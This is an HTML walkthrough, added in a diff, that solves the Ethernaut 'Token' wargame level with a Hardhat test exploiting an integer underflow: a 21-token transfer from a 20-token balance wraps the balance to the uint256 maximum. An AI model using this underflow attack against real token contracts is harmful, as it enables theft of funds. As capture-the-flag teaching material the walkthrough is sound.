@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 5: Token</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 5: Token</h1>
+
+        
+      </div>
+      
+        
+        
+        <div class='highlight'><pre><span class="hljs-keyword">import</span> {ethers} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;hardhat&#x27;</span>
+<span class="hljs-keyword">import</span> {<span class="hljs-title class_">Contract</span>, <span class="hljs-title class_">Signer</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;ethers&#x27;</span>
+
+<span class="hljs-keyword">import</span> {<span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>, expect, expectStatusOK, <span class="hljs-variable constant_">NULL_ADDRESS</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./testUtil&#x27;</span>
+
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LEVEL_ADDRESS</span> = <span class="hljs-string">&#x27;0x63bE8347A617476CA461649897238A31835a32CE&#x27;</span>
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">INSTANCE_ADDRESS</span> = <span class="hljs-string">&#x27;0x5e9fa95E273046f9975515Bf8a3100bA2ca24e8b&#x27;</span>
+
+<span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;05 Token&#x27;</span>, <span class="hljs-function">() =&gt;</span> {
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">ethernaut</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">instance</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signer</span>: <span class="hljs-title class_">Signer</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signerAddress</span>: <span class="hljs-built_in">string</span>
+
+  <span class="hljs-title function_">before</span>(<span class="hljs-keyword">async</span> () =&gt; {
+    ethernaut = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Ethernaut&#x27;</span>, <span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>)
+    instance = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Token&#x27;</span>, <span class="hljs-variable constant_">INSTANCE_ADDRESS</span>)
+
+    <span class="hljs-keyword">const</span> signers = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getSigners</span>()
+    signer = signers[<span class="hljs-number">0</span>]
+    signerAddress = <span class="hljs-keyword">await</span> signer.<span class="hljs-title function_">getAddress</span>()
+  })</pre></div>
+      
+        
+        <p><code>Token</code> doesn’t use <code>SafeMath</code>, so it’s possible to trick the balance check
+in <code>transfer</code> using an integer underflow. Our actual balance is 20. After <code>transfer</code>
+subtracts 21 from our balance, it will be the maximum value of <code>uint256</code>.</p>
+
+        <div class='highlight'><pre>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;calls transfer with negative value&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">transfer</span>(<span class="hljs-variable constant_">NULL_ADDRESS</span>, <span class="hljs-number">21</span>)
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expectStatusOK</span>(tx)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;has more tokens than before&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> balance = <span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">balanceOf</span>(signerAddress)
+    <span class="hljs-title function_">expect</span>(balance).<span class="hljs-property">to</span>.<span class="hljs-property">be</span>.<span class="hljs-title function_">gt</span>(<span class="hljs-number">20</span>)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;is validated&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expect</span>(ethernaut.<span class="hljs-title function_">submitLevelInstance</span>(instance.<span class="hljs-property">address</span>))
+      .<span class="hljs-property">to</span>.<span class="hljs-title function_">emit</span>(ethernaut, <span class="hljs-string">&#x27;LevelCompletedLog&#x27;</span>)
+      .<span class="hljs-title function_">withArgs</span>(signerAddress, <span class="hljs-variable constant_">LEVEL_ADDRESS</span>).<span class="hljs-property">eventually</span>
+  })
+})</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
